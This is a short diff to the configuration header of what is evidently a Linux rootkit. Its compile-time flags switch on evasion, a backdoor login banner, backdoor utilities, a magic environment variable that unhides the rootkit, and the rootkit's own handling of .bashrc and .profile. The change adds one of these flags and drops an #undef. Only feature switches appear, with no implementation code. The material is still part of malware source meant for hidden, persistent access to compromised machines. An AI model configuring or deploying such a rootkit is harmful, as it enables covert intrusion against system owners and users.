@@ -10,12 +10,12 @@
 // installed to.
 #define DO_EVASIONS
 
+#define ROOTKIT_BASHRC // the rootkit writes, maintains & removes .bashrc & .profile. somethings won't work properly wihout this.
 #define BACKDOOR_ROLF // shows banner on backdoor login
 #define BACKDOOR_UTIL // allows access to a host of backdoor utils.
 #define SET_MAGIC_ENV_UNHIDE // set the rootkit's magic environment variable when doing `./bdv unhideself`
 #define BACKDOOR_PKGMAN // allows access to certain package managers without ruining the box.
 
-#undef LINK_IF_ERR
 #define USE_CRYPT
 
 /* everything past here is setup.py */
